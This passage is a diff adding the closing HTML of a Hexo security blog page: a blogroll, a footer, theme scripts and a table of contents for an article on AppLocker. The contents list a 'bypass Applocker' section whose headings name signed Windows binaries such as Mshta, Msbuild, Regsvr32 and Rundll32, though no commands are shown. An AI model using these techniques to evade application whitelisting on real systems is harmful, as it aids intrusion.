+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是applocker"><span class="nav-number">2.</span> <span class="nav-text">什么是applocker</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#applocker规则"><span class="nav-number">2.1.</span> <span class="nav-text">applocker规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#applocker规则条件"><span class="nav-number">2.2.</span> <span class="nav-text">applocker规则条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AppLocker-默认规则"><span class="nav-number">2.3.</span> <span class="nav-text">AppLocker 默认规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AppLocker-规则行为"><span class="nav-number">2.4.</span> <span class="nav-text">AppLocker 规则行为</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建一个applocker规则"><span class="nav-number">2.5.</span> <span class="nav-text">创建一个applocker规则</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass-Applocker"><span class="nav-number">3.</span> <span class="nav-text">bypass Applocker</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Installutil-exe"><span class="nav-number">3.1.</span> <span class="nav-text">Installutil.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Msbuild-exe"><span class="nav-number">3.2.</span> <span class="nav-text">Msbuild.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mshta-exe"><span class="nav-number">3.3.</span> <span class="nav-text">Mshta.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Presentationhost-exe"><span class="nav-number">3.4.</span> <span class="nav-text">Presentationhost.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Regasm-exe、Regsvcs-exe"><span class="nav-number">3.5.</span> <span class="nav-text">Regasm.exe、Regsvcs.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bginfo"><span class="nav-number">3.6.</span> <span class="nav-text">Bginfo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cdb-exe"><span class="nav-number">3.7.</span> <span class="nav-text">Cdb.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cmstp-exe"><span class="nav-number">3.8.</span> <span class="nav-text">Cmstp.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Control-exe"><span class="nav-number">3.9.</span> <span class="nav-text">Control.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Csi-exe、Dnx-exe"><span class="nav-number">3.10.</span> <span class="nav-text">Csi.exe、Dnx.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fsi-exe"><span class="nav-number">3.11.</span> <span class="nav-text">fsi.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ie4unit-exe"><span class="nav-number">3.12.</span> <span class="nav-text">Ie4unit.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ieexec-exe"><span class="nav-number">3.13.</span> <span class="nav-text">Ieexec.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#InfDefaultInstall-exe"><span class="nav-number">3.14.</span> <span class="nav-text">InfDefaultInstall.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mavinject-exe"><span class="nav-number">3.15.</span> <span class="nav-text">Mavinject.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Msdeploy-exe"><span class="nav-number">3.16.</span> <span class="nav-text">Msdeploy.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSIEXEC"><span class="nav-number">3.17.</span> <span class="nav-text">MSIEXEC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msxsl-exe"><span class="nav-number">3.18.</span> <span class="nav-text">msxsl.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#odbcconf-exe"><span class="nav-number">3.19.</span> <span class="nav-text">odbcconf.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Regsvr32-exe"><span class="nav-number">3.20.</span> <span class="nav-text">Regsvr32.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rundll32-exe"><span class="nav-number">3.21.</span> <span class="nav-text">Rundll32.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Winword-exe"><span class="nav-number">3.22.</span> <span class="nav-text">Winword.exe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wmic-exe"><span class="nav-number">3.23.</span> <span class="nav-text">Wmic.exe</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
